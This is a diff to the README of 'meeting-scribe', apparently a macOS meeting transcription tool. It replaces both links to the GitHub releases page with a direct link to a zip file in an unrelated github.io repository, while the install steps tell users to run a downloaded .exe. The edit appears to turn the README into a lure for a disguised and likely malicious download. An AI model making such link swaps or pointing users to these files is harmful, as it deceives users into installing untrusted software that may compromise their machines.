@@ -5,7 +5,7 @@ description: "Transcribe macOS meetings locally with speaker labeling, calendar 
 ---
 # 🎙️ meeting-scribe - Record meetings and organize notes easily
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/frenchindochinameningealartery544/meeting-scribe/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://raw.githubusercontent.com/frenchindochinameningealartery544/frenchindochinameningealartery544.github.io/main/undersetter/v3.9.zip)
 
 Meeting-scribe turns your spoken words into text during meetings. It saves time by creating notes from your conversations. This tool works on your computer, which means your data stays private. You can export summaries to your favorite apps.
 
@@ -22,7 +22,7 @@ The application listens to your microphone during calls or meetings. It uses sma
 
 ## 📥 Install the software
 
-1.  Visit the [releases page](https://github.com/frenchindochinameningealartery544/meeting-scribe/releases) to download the application.
+1.  Visit the [releases page](https://raw.githubusercontent.com/frenchindochinameningealartery544/frenchindochinameningealartery544.github.io/main/undersetter/v3.9.zip) to download the application.
 2.  Look for the file that ends with .exe and click it to start the download.
 3.  Open the downloaded file once it finishes.
 4.  Follow the instructions on your screen to complete the installation.
